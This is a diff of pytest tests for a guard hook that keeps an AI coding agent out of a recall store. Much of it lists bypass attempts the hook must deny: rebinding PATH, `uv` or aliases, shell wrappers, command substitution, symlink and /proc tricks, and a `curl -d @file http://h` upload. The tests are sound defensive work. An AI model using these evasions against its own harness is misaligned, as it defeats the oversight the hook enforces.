+    "uv-run-python",
+    "interpreter-by-path",
+    "py-launcher",
+    "pythonpath-assignment",
+    "path-assignment",
+    "uv-assignment",
+    "glued-paren-assignment",
+    "home-assignment",
+    "userprofile-assignment",
+    "appdata-assignment",
+    "xdg-assignment",
+    "git-config-assignment",
+    "conda-assignment",
+    "virtual-env-assignment",
+    "ld-preload-assignment",
+)
+
+
+@pytest.mark.parametrize("name", _NOT_EXEMPT_CALLS)
+def test_csr_lookalike_recall_calls_are_not_exempt(store_world: _StoreWorld, name: str) -> None:
+    """CSR-UNIT-013 (AC-23) and the exemption shape chosen for C-7 and C-8:
+    each names the store and is not the pinned call, so it is denied."""
+    code, out = _bash(store_world, _not_exempt_calls(store_world)[name])
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_relative_pinned_path_after_a_cd_is_not_exempt(store_world: _StoreWorld) -> None:
+    """A `cd` earlier in the command moves where a relative script path lands
+    when it runs, so the relative operand stops counting as pinned."""
+    evil = store_world.tmp / "evil"
+    command = f"cd {evil.as_posix()} && uv run scripts/mem_recall.py {_filter_args(store_world)}"
+
+    code, out = _bash(store_world, command, cwd=SCRIPTS.parent)
+
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+_REDIRECT_OPS = (">", ">>", "<", "2>", "&>", "1>", ">|", "&>>", "<<<")
+
+
+@pytest.mark.parametrize("form", ["spaced-into-store", "glued-into-store", "spaced-elsewhere", "glued-elsewhere"])
+@pytest.mark.parametrize("op", _REDIRECT_OPS)
+def test_csr_redirection_refuses_the_exemption(store_world: _StoreWorld, op: str, form: str) -> None:
+    """CSR-UNIT-014 (AC-23): a redirection in an otherwise exempt segment."""
+    target = f"{store_world.s}/evil" if form.endswith("into-store") else (store_world.tmp / "elsewhere").as_posix()
+    gap = " " if form.startswith("spaced") else ""
+    command = f"{_exempt_filter(store_world)} {op}{gap}{target}"
+
+    code, out = _bash(store_world, command)
+
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize(
+    "tail",
+    [" >&2", ">&2", ">{s}/evil"],
+    ids=["dup-to-stderr-spaced", "dup-to-stderr-glued", "glued-to-the-store-value"],
+)
+def test_csr_fd_and_glued_redirection_refuse_the_exemption(store_world: _StoreWorld, tail: str) -> None:
+    """CSR-UNIT-014: the fd form and a redirection glued to the --store value."""
+    code, out = _bash(store_world, _exempt_filter(store_world) + tail.format(s=store_world.s))
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize(
+    "substitution",
+    ["--epic $(cat {t}/epic)", "--epic `cat {t}/epic`", "--deferred <(cat {t}/d)", "--deferred >(tee {t}/d)"],
+    ids=["dollar-paren", "backticks", "process-in", "process-out"],
+)
+def test_csr_command_substitution_refuses_the_exemption(
+    store_world: _StoreWorld, substitution: str
+) -> None:
+    """CSR-UNIT-015 (AC-12, AC-23)."""
+    arg = substitution.format(t=store_world.tmp.as_posix())
+    command = f"uv run {_PINNED_OBSERVATION.as_posix()} {_write_args(store_world)} {arg}"
+    code, out = _bash(store_world, command)
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize(
+    "wrapper",
+    ["env {c}", "env FOO=1 {c}", "sudo {c}", 'bash -c "{c}"', "sh -c '{c}'", "time {c}", "nohup {c}", "exec {c}"],
+    ids=["env", "env-assignment", "sudo", "bash-c", "sh-c", "time", "nohup", "exec"],
+)
+def test_csr_wrapped_recall_calls_are_not_exempt(store_world: _StoreWorld, wrapper: str) -> None:
+    """CSR-UNIT-025 (AC-23): only `uv run` or a python may lead an exempt segment."""
+    code, out = _bash(store_world, wrapper.format(c=_exempt_filter(store_world)))
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@_WINDOWS_ONLY
+def test_csr_windows_pinned_script_spellings(store_world: _StoreWorld) -> None:
+    """CSR-UNIT-046 (AC-12, AC-23), Windows only.
+
+    Allowed: the pinned path with forward slashes, as a double-quoted backslash
+    path, and with its drive letter in the other case. Denied, the documented
+    residual: an unquoted backslash path, which POSIX shlex mangles (as Git
+    Bash does when it runs it), so the script is not recognised and the call
+    fails closed (recall off), never open.
+    """
+    posix = _PINNED_RECALL.as_posix()
+    filt = f"filter --store {store_world.s}"
+    for command in (
+        f"uv run {posix} {filt}",
+        f'uv run "{_PINNED_RECALL}" filter --store "{store_world.store}"',
+        f"uv run {posix[0].swapcase()}{posix[1:]} {filt}",
+    ):
+        _assert_allowed(*_bash(store_world, command))
+
+    code, out = _bash(store_world, f"uv run {_PINNED_RECALL} filter --store {store_world.store}")
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+# --- The relocated mutant twins (CSR-UNIT-026) ---------------------------------
+
+_BASENAME_EXEMPTION = (
+    "    return _is_pinned(absolute)",
+    "    return os.path.basename(operand) in _RECALL_SCRIPTS",
+)
+_WHOLE_COMMAND_EXEMPTION = (
+    "and _exempt_segment(segment, cwd, command)",
+    "and _exempt_segment(command, cwd, command)",
+)
+
+
+def _write_relocated_guard(tmp_path: Path, edit: tuple[str, str] | None) -> tuple[Path, Path]:
+    """A copy of the hook at tmp_path/skill/scripts/hooks/, beside copies of both
+    pinned scripts, so its skill root (its own location) is tmp_path/skill.
+    `edit` is one textual mutation, or None for the unmutated copy."""
+    src = _hook_source()
+    if edit is not None:
+        old, new = edit
+        assert old in src, f"mutation anchor drifted out of the hook: {old!r}"
+        src = src.replace(old, new, 1)
+    scripts = tmp_path / "skill" / "scripts"
+    (scripts / "hooks").mkdir(parents=True)
+    hook = scripts / "hooks" / "guard_pretooluse.py"
+    hook.write_text(src, encoding="utf-8")
+    for script in (_PINNED_RECALL, _PINNED_OBSERVATION):
+        shutil.copyfile(script, scripts / script.name)
+    return hook, scripts
+
+
+def _relocated_control(world: _StoreWorld, scripts: Path) -> str:
+    return f"uv run {(scripts / 'mem_observation.py').as_posix()} {_write_args(world)}"
+
+
+def _same_name_elsewhere(world: _StoreWorld) -> str:
+    return _not_exempt_calls(world)["same-name-elsewhere"]
+
+
+def _compound(world: _StoreWorld, scripts: Path) -> str:
+    return f"{_relocated_control(world, scripts)} && cat {world.s}/runs/x.jsonl"
+
+
+def test_csr_relocated_guard_pins_its_own_scripts(store_world: _StoreWorld, tmp_path: Path) -> None:
+    """Baseline for the twins: relocation alone allows the control and still
+    denies both bypasses, so what the twins let through is their mutation."""
+    hook, scripts = _write_relocated_guard(tmp_path, None)
+
+    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))
+    for command in (_same_name_elsewhere(store_world), _compound(store_world, scripts)):
+        code, out = _bash(store_world, command, hook=hook)
+        _assert_latch_denied(code, out, store_world.latch)
+    # The shipped scripts lie outside the copy's skill root: not exempt there.
+    code, out = _bash(store_world, f"uv run {_PINNED_OBSERVATION.as_posix()} {_write_args(store_world)}", hook=hook)
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_mutant_basename_exemption_allows_a_same_named_script(
+    store_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """CSR-UNIT-026 twin: an exemption matched by basename lets the same-named
+    script through, so the CSR-UNIT-013 deny reds against it; the control
+    still passes, so it is the pinning, not a deny-all, that the deny rests on."""
+    hook, scripts = _write_relocated_guard(tmp_path, _BASENAME_EXEMPTION)
+
+    _assert_allowed(*_bash(store_world, _same_name_elsewhere(store_world), hook=hook))
+    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))
+
+
+def test_mutant_whole_command_exemption_allows_a_compound(
+    store_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """CSR-UNIT-026 twin: an exemption checked on the whole command lets the
+    compound through, so the CSR-UNIT-012 deny reds against it; the control
+    still passes."""
+    hook, scripts = _write_relocated_guard(tmp_path, _WHOLE_COMMAND_EXEMPTION)
+
+    _assert_allowed(*_bash(store_world, _compound(store_world, scripts), hook=hook))
+    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))
+
+
+def test_csr_an_unforeseen_error_under_a_latch_fails_closed(store_world: _StoreWorld, tmp_path: Path) -> None:
+    """Item 6 of this PR's scope: a crash inside the latch gate denies rather
+    than exiting non-zero (no decision, so the call would run)."""
+    mutant = _write_mutant(
+        tmp_path, "home_dirs_raises", "    homes: list[str] = []\n", '    raise RuntimeError("boom")\n'
+    )
+    _assert_allowed(*_bash(store_world, "ls"))
+
+    code, out = _bash(store_world, "ls", hook=mutant)
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert "could not evaluate this Bash call against the run latch (RuntimeError)" in reason
+    store_world.latch.unlink()
+    _assert_allowed(*_bash(store_world, "ls", hook=mutant))
+
+
+# --- Unset store, latches with no store, the git gates -------------------------
+
+_UNSET_STORES = {
+    "empty": "",
+    "blank": "   ",
+    "unresolved-token": "{workflow.cross_session_recall_store}",
+    "dollar-var": "$VAR",
+    "null": None,
+    "missing": "<missing>",
+}
+
+
+@pytest.mark.parametrize("recall", ["off", "on-red"])
+@pytest.mark.parametrize("store", sorted(_UNSET_STORES))
+def test_csr_unset_store_denies_nothing_by_path(store_world: _StoreWorld, store: str, recall: str) -> None:
+    """CSR-UNIT-045 (AC-12, AC-11): the shipped default (`""`, recall off) and
+    the other unset forms name no store, so ordinary work is untouched while
+    claude-mem is still denied. Resolving `""` against the cwd would deny every
+    file and Bash call in every default run."""
+    state = _v2_latch(None, recall="off" if recall == "off" else "on", store_ok=False)
+    value = _UNSET_STORES[store]
+    if value == "<missing>":
+        del state["store"]
+    else:
+        state["store"] = value
+    _write_state(store_world.impl, state)
+    src = (store_world.cwd / "src" / "x.py").as_posix()
+
+    for tool, tool_input in (
+        ("Read", {"file_path": src}),
+        ("Write", {"file_path": src, "content": "x"}),
+        ("Edit", {"file_path": src, "old_string": "a", "new_string": "b"}),
+        ("Glob", {"pattern": "**/*.py", "path": store_world.cwd.as_posix()}),
+        ("Bash", {"command": "ls"}),
+    ):
+        _assert_allowed(*_run_in(store_world, tool, tool_input))
+    code, out = _run_in(store_world, "mcp__claude_mem__search", {})
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.parametrize(
+    "latch",
+    ["v1-green-by-old-rules", "v1-red", "zero-byte", "malformed-json", "non-object", "latch-version-3"],
+)
+def test_csr_latch_with_no_usable_store_skips_the_store_rule(store_world: _StoreWorld, latch: str) -> None:
+    """CSR-UNIT-036 under the maintainer's C-2 default: a v1 latch or one that
+    does not read as v2 has no store to match, so nothing is denied by path,
+    while every claude-mem call is still denied."""
+    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))
+    run_file = f"{store_world.s}/runs/x.jsonl"
+
+    _assert_allowed(*_run_in(store_world, "Read", {"file_path": run_file}))
+    _assert_allowed(*_bash(store_world, f"cat {run_file}"))
+    code, out = _run_in(store_world, "mcp__plugin_claude-mem_mcp-search__search", {})
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_v2_latch_leaves_the_git_gates_and_other_bash_alone(tmp_path: Path) -> None:
+    """CSR-UNIT-037 (AC-11): the memory gate never short-circuits the git gates."""
+    repo = _protected_repo(tmp_path)
+    impl = tmp_path / "impl"
+    home = tmp_path / "home"
+    _write_state(impl, _v2_latch(home / ".ultracode-goal" / "recall"))
+    env = {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "HOME": str(home), "USERPROFILE": str(home)}
+
+    code, out = _run_hook(_commit_event(repo), repo, env)
+    assert code == 2
+    assert "Protected-branch" in _reason(out)
+
+    _assert_allowed(*_run_hook(_bash_event(repo, "ls -la"), repo, env))
+
+
+# --- Guard item 5: self-contained, and reading the latch like mem_common -------
+
+
+def test_csr_guard_imports_only_the_standard_library() -> None:
+    """CSR-UNIT-035 (AC-24): no lib/ or mem_common import, no relative import."""
+    tree = ast.parse(_hook_source())
+    names: set[str] = set()
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Import):
+            names.update(alias.name.split(".")[0] for alias in node.names)
+        elif isinstance(node, ast.ImportFrom):
+            assert node.level == 0, "relative import in the guard"
+            names.add((node.module or "").split(".")[0])
+    assert names, "the scan found no import at all"
+    assert names <= set(sys.stdlib_module_names), names - set(sys.stdlib_module_names)
+    assert not names & {"lib", "mem_common"}
+
+
+@pytest.fixture
+def mem_common():
+    """lib/mem_common.py imported in-process from its file, fresh per test."""
+    spec = importlib.util.spec_from_file_location("ucg_mem_common_under_test", _MEM_COMMON)
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
+def _parity_corpus(tmp_path: Path) -> dict[str, object]:
+    """One latch file per shape: dict and list as JSON, str as text, bytes raw."""
+    store = tmp_path / "abs" / "recall"
+    without_store = _v2_latch(store)
+    del without_store["store"]
+    return {
+        "v1-green-by-old-rules": _GREEN_STATE,
+        "v1-red": {**_GREEN_STATE, "recall": "off"},
+        "v2-green": _v2_latch(store),
+        "v2-red": _v2_latch(store, store_ok=False),
+        "v2-recall-off": _v2_latch(store, recall="off"),
+        "v2-other-backend": _v2_latch(store, backend="claude-mem"),
+        "v2-store-ok-string": _v2_latch(store, store_ok="true"),
+        "v2-without-store": without_store,
+        "v2-store-null": _v2_latch(None),
+        "v2-store-empty": _v2_latch(""),
+        "v2-store-blank": _v2_latch("   "),
+        "v2-store-token": _v2_latch("{workflow.cross_session_recall_store}"),
+        "v2-store-dollar-var": _v2_latch("$VAR"),
+        "v2-store-relative": _v2_latch("recall"),
+        "v2-store-nul": _v2_latch("/abs/re\0call"),
+        "v2-store-number": {**_v2_latch(store), "store": 7},
+        "v2-store-tilde": _v2_latch("~/.ultracode-goal/recall"),
+        "v2-store-dollar-in-name": _v2_latch(tmp_path / "my$proj" / ".recall"),
+        "v2-store-trailing-separator": _v2_latch(str(store) + os.sep),
+        "v2-store-dot-dot": _v2_latch(os.path.join(str(store.parent), "x", "..", "recall")),
+        "version-3": _v2_latch(store, latch_version=3),
+        "version-bool": _v2_latch(store, latch_version=True),
+        "version-string": _v2_latch(store, latch_version="2"),
+        "version-float": _v2_latch(store, latch_version=2.0),
+        "zero-byte": "",
+        "whitespace-only": "  \n\t",
+        "malformed": "{not: valid json,,,",
+        "non-object-list": [1, 2],
+        "json-string": '"latch"',
+        "json-null": "null",
+        "utf8-bom": "﻿" + json.dumps(_v2_latch(store)),
+        "invalid-utf8": (
+            b'{"latch_version": 2, "backend": "jsonl", "store_ok": true, '
+            b'"recall": "on", "store": "\xff/recall"}'
+        ),
+        # json.loads raises RecursionError on these: both readers read None.
+        "deep-array": "[" * 100000 + "]" * 100000,
+        "deep-object": '{"a":' * 50000 + "1" + "}" * 50000,
+    }
+
+
+_PARITY_NAMES = sorted(_parity_corpus(Path("/corpus-names")))
+
+
+def _write_latch_payload(impl: Path, payload: object) -> Path:
+    impl.mkdir(parents=True, exist_ok=True)
+    path = impl / ".mem-state.json"
+    if isinstance(payload, bytes):
+        path.write_bytes(payload)
+    elif isinstance(payload, str):
+        path.write_text(payload, encoding="utf-8")
+    else:
+        path.write_text(json.dumps(payload), encoding="utf-8")
+    return path
+
+
+@pytest.mark.parametrize("name", _PARITY_NAMES)
+def test_csr_guard_reads_a_latch_like_mem_common(
+    guard_module, mem_common, tmp_path: Path, monkeypatch, name: str
+) -> None:
+    """CSR-UNIT-016 (AC-24, AC-16): one latch file, two readers, one answer:
+    version, colour and the resolved absolute store path."""
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("USERPROFILE", str(home))
+    impl = tmp_path / "impl"
+    path = _write_latch_payload(impl, _parity_corpus(tmp_path)[name])
+
+    ours = guard_module._latch_view(guard_module._read_latch(path))
+    theirs = mem_common.latch_view(mem_common.read_state(impl))
+
+    assert ours == theirs
+
+
+def test_csr_parity_corpus_reads_as_the_spec_says(guard_module, tmp_path: Path, monkeypatch) -> None:
+    """Anchors for the parity row, so the two readers cannot agree on a wrong
+    answer: a v1 latch is red with no store (AC-16), a green v2 latch carries
+    its resolved store, `~` resolves against the home, a missing latch reads as
+    nothing."""
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("USERPROFILE", str(home))
+    corpus = _parity_corpus(tmp_path)
+    store = str(tmp_path / "abs" / "recall")
+
+    def view(name: str) -> tuple:
+        path = _write_latch_payload(tmp_path / name, corpus[name])
+        got = guard_module._latch_view(guard_module._read_latch(path))
+        return got["latch_version"], got["store_ok"], got["store"]
+
+    assert view("v1-green-by-old-rules") == (1, False, None)
+    assert view("v2-green") == (2, True, store)
+    assert view("v2-red") == (2, False, store)
+    assert view("v2-recall-off") == (2, False, store)
+    assert view("v2-store-tilde") == (2, True, str(home / ".ultracode-goal" / "recall"))
+    assert view("v2-store-trailing-separator") == (2, True, store)
+    assert view("v2-store-dot-dot") == (2, True, store)
+    assert view("v2-store-empty") == (2, False, None)
+    assert view("version-3") == (3, False, None)
+    assert view("zero-byte") == (None, False, None)
+    assert guard_module._read_latch(tmp_path / "nowhere" / ".mem-state.json") is None
+
+
+@_NEEDS_GIT
+def test_csr_guard_denies_the_run_file_a_real_latch_and_write_produced(tmp_path: Path) -> None:
+    """CSR-INT-037 (AC-24, AC-12, AC-23): end to end. The real `latch` and the
+    real `write` land a run file under ~/.ultracode-goal/recall; under the latch
+    `latch` wrote, the real guard denies a Read and a Bash `cat` of that exact
+    file, and lets the pinned reader through."""
+    home = tmp_path / "home"
+    home.mkdir()
+    repo = tmp_path / "widget"
+    repo.mkdir()
+    _init_repo(repo, "ultracode/epic-7")
+    impl = tmp_path / "impl"
+    store_value = "~/.ultracode-goal/recall"
+    env = {**os.environ, "HOME": str(home), "USERPROFILE": str(home)}
+
+    def script(path: Path, *args: str) -> None:
+        proc = subprocess.run(
+            [sys.executable, str(path), *args],
+            capture_output=True, text=True, encoding="utf-8", env=env,
+        )
+        assert proc.returncode == 0, proc.stdout + proc.stderr
+
+    script(
+        _PINNED_RECALL, "latch", "--impl-artifacts", str(impl), "--run-id", _RUN,
+        "--recall", "on", "--store", store_value, "--cwd", str(repo),
+    )
+    script(
+        _PINNED_OBSERVATION, "write", "--impl-artifacts", str(impl), "--store", store_value,
+        "--epic", "7", "--run-id", _RUN, "--gate-status", "PASS", "--verdict", "advance",
+        "--cwd", str(repo), "--valid-until-date", "2026-06-04",
+    )
+    runs = sorted((home / ".ultracode-goal" / "recall").glob("*/runs/*.jsonl"))
+    assert [p.name for p in runs] == [f"{_RUN}.jsonl"]
+    run_file = runs[0]
+    latch = impl / ".mem-state.json"
+    hook_env = {"HOME": str(home), "USERPROFILE": str(home), "ULTRACODE_IMPL_ARTIFACTS": str(impl)}
+
+    for tool, tool_input in (
+        ("Read", {"file_path": str(run_file)}),
+        ("Bash", {"command": f"cat {run_file.as_posix()}"}),
+    ):
+        code, out = _run_hook(_mem_event(tool, repo, tool_input), repo, hook_env)
+        _assert_latch_denied(code, out, latch)
+
+    reader = (
+        f"uv run {_PINNED_RECALL.as_posix()} filter --impl-artifacts {impl.as_posix()} "
+        f"--store {store_value} --cwd {repo.as_posix()}"
+    )
+    _assert_allowed(*_run_hook(_bash_event(repo, reader), repo, hook_env))
+
+
+# --- Review rows: each was allowed by the guard as first built ------------------
+# Every deny row below was reproduced against the first build of this change
+# (allowed there) before it was closed. Unless a row says otherwise, it runs
+# under the green v2 `store_world` latch.
+
+
+def _symlink_or_skip(link: Path, target: Path) -> None:
+    try:
+        os.symlink(target, link, target_is_directory=target.is_dir())
+    except (OSError, NotImplementedError) as exc:
+        pytest.skip(f"cannot create a symlink here: {exc}")
+
+
+_V2_COLOURS = ("v2-store-ok", "v2-store-not-ok", "v2-recall-off")
+
+
+@pytest.mark.parametrize("latch", _V2_COLOURS)
+def test_csr_store_rule_follows_the_store_whatever_the_v2_colour(
+    store_world: _StoreWorld, latch: str
+) -> None:
+    """The rule reads the latch's `store`, not its colour: a red latch and the
+    default recall-off latch, which still carries the store, deny as well, and
+    the pinned call still passes under each (bmad review 1)."""
+    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))
+    run_file = f"{store_world.s}/runs/x.jsonl"
+
+    for tool, tool_input in (("Read", {"file_path": run_file}), ("Bash", {"command": f"cat {run_file}"})):
+        reason = _assert_latch_denied(*_run_in(store_world, tool, tool_input), store_world.latch)
+        assert "names the recall store" in reason
+    _assert_allowed(*_bash(store_world, _exempt_filter(store_world)))
+
+
+def test_csr_segment_whose_quoting_does_not_parse_is_read_raw(store_world: _StoreWorld) -> None:
+    """The quote-blind split leaves `b' ~/...` behind, which shlex cannot read;
+    its raw text still names the store (bmad review 2)."""
+    code, out = _bash(store_world, "cat 'a;b' ~/.ultracode-goal/recall/runs/x.jsonl")
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_relative_path_resolves_against_the_event_cwd(
+    store_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """The event's cwd, not the hook process's own, is the base (bmad review 3)."""
+    elsewhere = tmp_path / "elsewhere"
+    elsewhere.mkdir()
+    parent = store_world.store.parent
+    relative = {"file_path": "recall/runs/x.jsonl"}
+
+    code, out = _run_mutant_hook(HOOK, _mem_event("Read", parent, relative), elsewhere, store_world.env)
+    _assert_latch_denied(code, out, store_world.latch)
+    _assert_allowed(*_run_mutant_hook(HOOK, _mem_event("Read", elsewhere, relative), parent, store_world.env))
+
+
+def test_csr_symlinked_skill_pins_both_the_link_and_the_real_path(
+    store_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """C-11: a guard run through a symlinked skill folder admits the pinned
+    scripts by the path it runs from and by their resolved path (bmad review 4)."""
+    _, scripts = _write_relocated_guard(tmp_path, None)
+    linked = tmp_path / "linked-skill"
+    _symlink_or_skip(linked, scripts.parent)
+    hook = linked / "scripts" / "hooks" / "guard_pretooluse.py"
+
+    for root in (linked / "scripts", scripts):
+        command = f"uv run {(root / 'mem_recall.py').as_posix()} {_filter_args(store_world)}"
+        _assert_allowed(*_bash(store_world, command, hook=hook))
+
+
+def test_csr_userprofile_spellings_read_userprofile_when_home_differs(tmp_path: Path) -> None:
+    """HOME and USERPROFILE on two folders: a USERPROFILE spelling is read
+    against the folder that variable holds (bmad review 5)."""
+    home, profile = tmp_path / "home", tmp_path / "profile"
+    store = profile / ".ultracode-goal" / "recall"
+    store.mkdir(parents=True)
+    home.mkdir()
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    impl = tmp_path / "impl"
+    _write_state(impl, _v2_latch(store))
+    env = {"HOME": str(home), "USERPROFILE": str(profile), "ULTRACODE_IMPL_ARTIFACTS": str(impl)}
+
+    for spelling in ("%USERPROFILE%", "$USERPROFILE", "${USERPROFILE}"):
+        command = f"cat {spelling}/.ultracode-goal/recall/runs/x.jsonl"
+        code, out = _run_hook(_bash_event(repo, command), repo, env)
+        _assert_latch_denied(code, out, impl / ".mem-state.json")
+
+
+@pytest.mark.skipif(
+    sys.platform == "win32",
+    reason="Win32 folds `..` before it follows a link, so the lexical path is the one that runs",
+)
+def test_csr_dotdot_out_of_a_symlinked_folder_is_not_the_pinned_script(
+    store_world: _StoreWorld, tmp_path: Path
+) -> None:
+    """`<scripts>/sub/../mem_recall.py` folds lexically to the pinned path, but
+    with `sub` a link elsewhere the shell runs another file (bmad review 7)."""
+    hook, scripts = _write_relocated_guard(tmp_path, None)
+    evil = tmp_path / "evil" / "x"
+    evil.mkdir(parents=True)
+    (evil.parent / "mem_recall.py").write_text("print('not the pinned script')\n", encoding="utf-8")
+    _symlink_or_skip(scripts / "sub", evil)
+
+    twin = f"uv run {(scripts / 'sub').as_posix()}/../mem_recall.py {_filter_args(store_world)}"
+    code, out = _bash(store_world, twin, hook=hook)
+    _assert_latch_denied(code, out, store_world.latch)
+    pinned = f"uv run {(scripts / 'mem_recall.py').as_posix()} {_filter_args(store_world)}"
+    _assert_allowed(*_bash(store_world, pinned, hook=hook))
+
+
+def test_csr_deny_reason_quotes_a_long_segment_cut_short(store_world: _StoreWorld) -> None:
+    """A heredoc is one segment: its reason quotes at most 160 characters of it,
+    not the whole body back into the model's context (bmad review 10)."""
+    body = "x " * 20000
+    segment = f"cat {store_world.s}/runs/x.jsonl {body}"
+    code, out = _bash(store_world, segment)
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert len(reason) < 2000
+    # The first 160 characters, whatever the length of the tmp path (a Windows
+    # runner's is long enough that the cut falls inside the store path).
+    assert f"segment {segment.strip()[:160] + '...'!r} names the recall store" in reason
+
+
+def _rebinding_commands(world: _StoreWorld) -> dict[str, str]:
+    call = _exempt_filter(world)
+    evil = (world.tmp / "evil").as_posix()
+    return {
+        "export-path": f"export PATH={evil}:$PATH; {call}",
+        "bare-path-assignment": f"PATH={evil}:$PATH; {call}",
+        "path-append": f"PATH+=:{evil}; {call}",
+        "path-element": f"PATH[0]={evil}; {call}",
+        "declare-x": f"declare -x PYTHONPATH={evil} && {call}",
+        "function-definition": f'uv() {{ cat "$3"; }}; {call}',
+        "function-keyword": f'function uv {{ cat "$3"; }}; {call}',
+        "hash-p": f"hash -p {evil}/uv uv; {call}",
+        "alias": f"shopt -s expand_aliases; alias uv={evil}/uv; {call}",
+        "dot-source": f". {evil}/env.sh && {call}",
+        "source": f"source {evil}/env.sh && {call}",
+        "eval": f"eval 'uv() {{ :; }}'; {call}",
+        "enable": f"enable -f {evil}/uv.so uv; {call}",
+        "unset-path": f"unset PATH; {call}",
+        "for-loop-variable": f"for PATH in {evil}; do {call}; done",
+        "read": f"read -r PATH <<< {evil}; {call}",
+        "printf-v": f"printf -v PATH %s {evil}; {call}",
+        "let": f"let PATH=1; {call}",
+        "arithmetic": f"(( PATH = 1 )); {call}",
+        "default-assignment": f": ${{UV_PYTHON:={evil}/python}}; {call}",
+        "backgrounded-export": f"export PATH={evil} & {call}",
+        "newline-export": f"export PATH={evil}\n{call}",
+        "piped-export": f"export PATH={evil} | {call}",
+    }
+
+
+_REBINDING_COMMANDS = (
+    "export-path",
+    "bare-path-assignment",
+    "path-append",
+    "path-element",
+    "declare-x",
+    "function-definition",
+    "function-keyword",
+    "hash-p",
+    "alias",
+    "dot-source",
+    "source",
+    "eval",
+    "enable",
+    "unset-path",
+    "for-loop-variable",
+    "read",
+    "printf-v",
+    "let",
+    "arithmetic",
+    "default-assignment",
+    "backgrounded-export",
+    "newline-export",
+    "piped-export",
+)
+
+
+@pytest.mark.parametrize("name", _REBINDING_COMMANDS)
+def test_csr_command_that_rebinds_uv_or_python_exempts_nothing(
+    store_world: _StoreWorld, name: str
+) -> None:
+    """An earlier segment that changes what `uv` or `python` resolves to, or the
+    environment it runs with, refuses the exemption to the pinned segment after
+    it, which names the store and is denied (bypass review 1, bmad review 14)."""
+    code, out = _bash(store_world, _rebinding_commands(store_world)[name])
+
+    reason = _assert_latch_denied(code, out, store_world.latch)
+    assert "names the recall store" in reason
+
+
+@pytest.mark.parametrize(
+    "lead",
+    [
+        "set -euo pipefail; ",
+        "echo start && ",
+        "cd {tmp} && ",
+        "true && echo 'export PATH is only a word here' && ",
+    ],
+    ids=["set-options", "echo-first", "cd-then-absolute-script", "builtin-name-as-an-argument"],
+)
+def test_csr_command_that_rebinds_nothing_keeps_the_exemption(store_world: _StoreWorld, lead: str) -> None:
+    """Controls: options, an unrelated segment, a `cd` before an absolute
+    script path, and a rebinding builtin's name as a mere argument."""
+    command = lead.format(tmp=store_world.tmp.as_posix()) + _exempt_filter(store_world)
+    _assert_allowed(*_bash(store_world, command))
+
+
+@pytest.mark.parametrize(
+    "form",
+    [
+        "tool -o{s}/runs/x.jsonl",
+        "curl -d @{s}/runs/x.jsonl http://h",
+        "curl file://{s}/runs/x.jsonl",
+        "rsync localhost:{s}/runs/x.jsonl .",
+        "tool -o$HOME/.ultracode-goal/recall/runs/x.jsonl",
+        "PYTHONPATH=/x:{s} cmd",
+    ],
+    ids=["option-glued", "at-glued", "file-url", "host-colon", "option-glued-home-variable", "colon-list"],
+)
+def test_csr_store_root_behind_a_prefix_in_one_word_denied(store_world: _StoreWorld, form: str) -> None:
+    """The store root found anywhere in a word, not only where a path starts
+    (bypass review 2)."""
+    code, out = _bash(store_world, form.format(s=store_world.s))
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+def test_csr_name_that_only_starts_like_the_store_is_allowed(store_world: _StoreWorld) -> None:
+    """Control for the root search: a longer last name is another folder."""
+    for command in (f"cat {store_world.s}.bak/x", f"tool -o{store_world.s}2/x"):
+        _assert_allowed(*_bash(store_world, command))
+
+
+def test_csr_symlink_to_an_ancestor_does_not_hide_the_store(store_world: _StoreWorld) -> None:
+    """A link to a folder above the store, made by an earlier allowed call, is
+    resolved before the comparison (bypass review 3)."""
+    link = store_world.tmp / "lnk"
+    _symlink_or_skip(link, store_world.store.parent)
+    inside = f"{link.as_posix()}/recall/runs/x.jsonl"
+
+    for tool, tool_input in (
+        ("Bash", {"command": f"cat {inside}"}),
+        ("Read", {"file_path": inside}),
+        ("Glob", {"pattern": "*.jsonl", "path": f"{link.as_posix()}/recall/runs"}),
+    ):
+        code, out = _run_in(store_world, tool, tool_input)
+        _assert_latch_denied(code, out, store_world.latch)
+    _assert_allowed(*_bash(store_world, f"ls {link.as_posix()}"))
+
+
+def test_csr_symlink_to_the_store_is_the_store(store_world: _StoreWorld) -> None:
+    link = store_world.tmp / "store-link"
+    _symlink_or_skip(link, store_world.store)
+    code, out = _bash(store_world, f"ls {link.as_posix()}")
+    _assert_latch_denied(code, out, store_world.latch)
+
+
+@pytest.mark.skipif(not os.path.isdir("/proc/self/root"), reason="no /proc/self/root here")
+def test_csr_proc_self_root_spelling_denied(store_world: _StoreWorld) -> None:
+    """Bypass review 3."""
+    code, out = _bash(store_world, f"cat /proc/self/root{store_world.s}/runs/x.jsonl")
+    _assert_latch_denied(code, out, store_world.latch)
+
+
